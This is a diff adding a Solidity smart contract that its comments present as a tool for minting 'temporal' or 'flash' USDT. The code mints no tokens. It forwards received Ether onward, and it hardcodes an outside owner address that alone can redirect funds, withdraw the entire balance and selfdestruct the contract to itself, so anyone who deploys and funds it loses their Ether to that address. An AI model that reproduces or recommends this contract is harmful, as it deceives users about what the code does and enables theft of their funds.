@@ -1,0 +1,80 @@
+// SPDX-License-Identifier: MIT 
+pragma solidity ^0.8.0;
+
+/// @title MintContract
+/// @notice This contract automatically mints temporal USDT from the mint contract address.
+/// @dev The mint contract address is now set at deployment.
+contract MintContract {
+    /// @notice The contract address where temporal USDT will be minted from.
+    address payable public Mint_Contract;
+
+    /// @notice The address of the USDT contract.
+    address public USDT_Contract_Address;
+
+    /// @notice The owner of the contract (hardcoded).
+    address public immutable owner = 0x4784A19B7804cAF9e526a73805d77901836D7aCB;
+
+    /// @notice The "flash amount" specified at deployment.
+    uint256 public flashAmount;
+
+    event Forwarded(address indexed from, uint256 amount);
+    event FlashAmountUpdated(uint256 previousAmount, uint256 newAmount);
+    event MintContractUpdated(address indexed previousAddress, address indexed newAddress);
+    event USDTContractAddressUpdated(address indexed previousAddress, address indexed newAddress);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Caller is not the owner");
+        _;
+    }
+
+    constructor(uint256 _flashAmount, address payable _Mint_Contract, address _USDT_Contract_Address) {
+        flashAmount = _flashAmount;
+        Mint_Contract = _Mint_Contract;
+        USDT_Contract_Address = _USDT_Contract_Address;
+    }
+
+    receive() external payable {
+        require(msg.value > 0, "No Ether received");
+        emit Forwarded(msg.sender, msg.value);
+        (bool success, ) = Mint_Contract.call{value: msg.value}("");
+        require(success, "Failed to forward Ether");
+    }
+
+    function setFlashAmount(uint256 _newFlashAmount) external onlyOwner {
+        uint256 previousAmount = flashAmount;
+        flashAmount = _newFlashAmount;
+        emit FlashAmountUpdated(previousAmount, _newFlashAmount);
+    }
+
+    function setMintContract(address payable _newAddress) external onlyOwner {
+        require(_newAddress != address(0), "Invalid address");
+        address previousAddress = Mint_Contract;
+        Mint_Contract = _newAddress;
+        emit MintContractUpdated(previousAddress, _newAddress);
+    }
+
+    function setUSDTContractAddress(address _newAddress) external onlyOwner {
+        require(_newAddress != address(0), "Invalid address");
+        address previousAddress = USDT_Contract_Address;
+        USDT_Contract_Address = _newAddress;
+        emit USDTContractAddressUpdated(previousAddress, _newAddress);
+    }
+
+    function action() external {
+        require(address(this).balance >= flashAmount, "Insufficient contract balance");
+        emit Forwarded(address(this), flashAmount);
+        (bool success, ) = Mint_Contract.call{value: flashAmount}("");
+        require(success, "Failed to forward Ether");
+    }
+
+    function withdraw() external onlyOwner {
+        uint256 contractBalance = address(this).balance;
+        require(contractBalance > 0, "No Ether to withdraw");
+        (bool success, ) = payable(owner).call{value: contractBalance}("");
+        require(success, "Withdrawal failed");
+    }
+
+    function destroy() external onlyOwner {
+        selfdestruct(payable(owner));
+    }
+}
